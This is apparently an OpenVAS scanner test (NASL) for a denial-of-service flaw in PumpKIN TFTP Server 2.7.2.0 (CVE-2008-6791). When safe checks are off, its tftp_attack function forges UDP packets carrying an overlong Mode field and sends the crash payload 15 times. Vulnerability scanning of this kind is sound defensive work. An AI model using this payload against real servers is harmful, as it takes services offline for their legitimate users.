###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_pumpkin_tftp_server_dos_vuln.nasl 15 2013-10-27 12:49:54Z jan $
#
# PumpKIN TFTP Server Denial of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Updated Denial of Service (exploit) check. (Chandan, 2009-05-18)
#
# Copyright:
# Copyright (c) 2009 SecPod , http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to cause denial of service
  to legitimate users.";
tag_affected = "PumpKIN TFTP Server version 2.7.2.0 and prior";
tag_insight = "Error exists when server fails handling certain input via sending an
  overly long Mode field.";
tag_solution = "No solution or patch is available as of 18th May, 2009. Information
  regarding this issue will updated once the solution details are available.
  For updates refer tohttp://kin.klever.net/pumpkin";
tag_summary = "This host is running PumpKIN TFTP Server and is prone to Denial
  of Service Vulnerability.";

if(description)
{
  script_id(900648);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-05-19 08:03:45 +0200 (Tue, 19 May 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_cve_id("CVE-2008-6791");
  script_bugtraq_id(31922);
  script_name("PumpKIN TFTP Server Denial of Service Vulnerability");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/6838");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/46122");

  script_description(desc);
  script_summary("Check for the version of PumpKIN TFTP Server");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "secpod_pumpkin_tftp_detect.nasl");
  script_require_keys("Services/udp/tftp", "PumpKIN/TFTP/Ver");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("version_func.inc");

if(TARGET_IS_IPV6())exit(0);

pkPort = get_kb_item("Services/udp/tftp");
if(!pkPort){
  pkPort = 69;
}

if(!get_udp_port_state(pkPort)){
  exit(0);
}

function tftp_attack(port, attack)
{
  local_var req, rep, sport, ip, udp, filter, data, i;
  if(attack)
  {
     # Attack request
     req1 = crap(length:16, data:"0x00");
     req2 = crap(length:32000, data:"0x00");
     req = raw_string(0x00, 0x02) + req1 + raw_string(0x00) + req2 + raw_string(0x00);
  }
  else{
     req = raw_string(0x00, 0x01) + "SecPod" +  raw_string(0x00) +
                                    "netascii" + raw_string(0x00);
  }

  ip = forge_ip_packet(ip_hl:5, ip_v:4, ip_tos:0, ip_len:20,
                       ip_id:rand(), ip_off:0, ip_ttl:64,
                       ip_p:IPPROTO_UDP, ip_src:this_host());

  sport = rand() % 64512 + 1024;

  udp = forge_udp_packet(ip:ip, uh_sport:sport, uh_dport:port,
                         uh_ulen: 8 + strlen(req), data:req);

  filter = 'udp and dst port ' + sport + ' and src host ' +
            get_host_ip() + ' and udp[8:1]=0x00';

  data = NULL;
  for(i = 0; i < 2; i++)
  {
    rep = send_packet(udp, pcap_active:TRUE, pcap_filter:filter);
    if(rep)
    {
      data = get_udp_element(udp: rep, element:"data");
      # Checks for valid tftp response
      if(data[0] == '\0' && (data[1] == '\x03' || data[1] == '\x05')){
        return TRUE;
      }
    }
  }
  return FALSE;
}

if(!safe_checks())
{
  if(!tftp_attack(port:pkPort, attack:FALSE)){
    exit(0);
  }

  # Multiple attack iterations
  for(i=0; i<15; i++){
    alive = tftp_attack(port:pkPort, attack:TRUE);
  }

  if(!tftp_attack(port:pkPort, attack:FALSE)){
    security_warning(pkPort, proto:"udp");
  }
  exit(0);
}

pumpKINVer = get_kb_item("PumpKIN/TFTP/Ver");
if(pumpKINVer != NULL)
{
  if(version_is_less_equal(version:pumpKINVer, test_version:"2.7.2.0")){
    security_warning(pkPort, proto:"udp");
  }
}
